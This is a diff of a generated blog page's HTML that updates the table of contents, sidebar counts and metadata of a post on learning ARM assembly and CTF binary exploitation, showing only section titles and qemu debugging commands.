-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84iot%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-arm%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">从0开始的iot学习记录-arm篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%92%8C%E5%90%AF%E5%8A%A8-%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">环境配置和启动,调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.1.</span> <span class="toc-text">配置环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">启动,调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">直接调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E8%BF%9B%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">加载进程调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E9%9B%86%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.</span> <span class="toc-text">汇编指令集介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AARCH64"><span class="toc-number">1.3.1.</span> <span class="toc-text">AARCH64</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%AD%98%E5%82%A8"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">数据加载与存储</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">条件跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">系统调用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARM"><span class="toc-number">1.3.2.</span> <span class="toc-text">ARM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97-1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%82%A8%E5%AD%98"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">数据加载与储存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E6%B5%81%E6%8E%A7%E5%88%B6"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">指令流控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E6%93%8D%E4%BD%9C"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">栈操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0"><span class="toc-number">1.4.</span> <span class="toc-text">题目练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-arm"><span class="toc-number">1.4.1.</span> <span class="toc-text">baby_arm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">简要分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E4%B9%A6%E5%86%99"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">shellcode书写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E7%94%A8execve"><span class="toc-number">1.4.1.2.1.</span> <span class="toc-text">调用execve</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#orw%E8%B0%83%E7%94%A8"><span class="toc-number">1.4.1.2.2.</span> <span class="toc-text">orw调用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97NX%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">对抗NX保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-buffer-overflow-basic"><span class="toc-number">1.4.2.</span> <span class="toc-text">stack_buffer_overflow_basic</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#arm%E6%9E%B6%E6%9E%84%E7%9A%84shellcode%E4%B9%A6%E5%86%99"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">arm架构的shellcode书写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#execve"><span class="toc-number">1.4.2.1.1.</span> <span class="toc-text">execve</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#orw"><span class="toc-number">1.4.2.1.2.</span> <span class="toc-text">orw</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-spraying"><span class="toc-number">1.4.3.</span> <span class="toc-text">stack_spraying</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#typo"><span class="toc-number">1.4.4.</span> <span class="toc-text">typo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">判断溢出长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-3"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84iot%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-arm%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">从0开始的iot学习记录-arm篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%92%8C%E5%90%AF%E5%8A%A8-%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">环境配置和启动,调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.1.</span> <span class="toc-text">配置环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">启动,调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">直接调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E8%BF%9B%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">加载进程调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E9%9B%86%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.</span> <span class="toc-text">汇编指令集介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AARCH64"><span class="toc-number">1.3.1.</span> <span class="toc-text">AARCH64</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%AD%98%E5%82%A8"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">数据加载与存储</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">条件跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">系统调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HINT%E4%BC%98%E5%8C%96%E6%8F%90%E7%A4%BA%EF%BC%88%E7%94%A8%E4%BA%8E%E5%A4%84%E7%90%86%E5%99%A8%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">HINT优化提示（用于处理器）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ARM"><span class="toc-number">1.4.1.</span> <span class="toc-text">ARM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97-1"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%82%A8%E5%AD%98"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">数据加载与储存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E6%B5%81%E6%8E%A7%E5%88%B6"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">指令流控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E6%93%8D%E4%BD%9C"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">栈操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.4.1.5.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0"><span class="toc-number">1.5.</span> <span class="toc-text">题目练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-arm"><span class="toc-number">1.5.1.</span> <span class="toc-text">baby_arm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">简要分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E4%B9%A6%E5%86%99"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">shellcode书写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E7%94%A8execve"><span class="toc-number">1.5.1.2.1.</span> <span class="toc-text">调用execve</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#orw%E8%B0%83%E7%94%A8"><span class="toc-number">1.5.1.2.2.</span> <span class="toc-text">orw调用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97NX%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">对抗NX保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-buffer-overflow-basic"><span class="toc-number">1.5.2.</span> <span class="toc-text">stack_buffer_overflow_basic</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#arm%E6%9E%B6%E6%9E%84%E7%9A%84shellcode%E4%B9%A6%E5%86%99"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">arm架构的shellcode书写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#execve"><span class="toc-number">1.5.2.1.1.</span> <span class="toc-text">execve</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#orw"><span class="toc-number">1.5.2.1.2.</span> <span class="toc-text">orw</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0restart-syscall"><span class="toc-number">1.6.</span> <span class="toc-text">0restart_syscall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2fork"><span class="toc-number">1.7.</span> <span class="toc-text">2fork</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-spraying"><span class="toc-number">1.7.1.</span> <span class="toc-text">stack_spraying</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#typo"><span class="toc-number">1.7.2.</span> <span class="toc-text">typo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">判断溢出长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-3"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -1175,15 +710,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">24</div>
+    <div class="sidebar-state-number">25</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">2</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">9</div>
+    <div class="sidebar-state-number">0</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -1320,13 +855,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "zer00ne",
-          title: "arm合集",
+          title: "arm基础",
           url: "https://khighl.github.io.git/2025/05/29/arm%E5%9F%BA%E7%A1%80/",
           excerpt: "",
           description: "",
-          stripContent: "从0开始的iot学习记录-arm篇前言 这篇博客会持续更新,作为我入坑iot的异架构学习记录 会记录刷题记录和arm汇编指令集 感谢winmt师傅,孤鸿师傅和爱师傅的帮助指导和🍐  环境配置和启动,调试配置环境主要需要的是gdbserver,gdb-multiarch和qemu可以参考孤鸿师傅的博客配置:Blog 启动,调试启动直接使用 1qemu-aarch64 ./pwn  调试分为直接调试和加载进程调试 直接调试在shell中输入 1qemu-aarch64 -g 1234 ./pwn ",
+          stripContent: "从0开始的iot学习记录-arm篇前言 这篇博客会持续更新,作为我入坑iot的异架构学习记录  会记录刷题记录和arm汇编指令集  感谢winmt师傅,孤鸿师傅和爱师傅的帮助指导和🍐   环境配置和启动,调试配置环境主要需要的是gdbserver,gdb-multiarch和qemu可以参考孤鸿师傅的博客配置:Blog 启动,调试启动直接使用 1qemu-aarch64 ./pwn  调试分为直接调试和加载进程调试 直接调试在shell中输入 1qemu-aarch64 -g 1234 ./p",
           date: "Thu May 29 2025 00:00:00 GMT+0800",
-          updated: "Mon Jun 02 2025 16:42:56 GMT+0800",
+          updated: "Tue Mar 24 2026 09:55:12 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
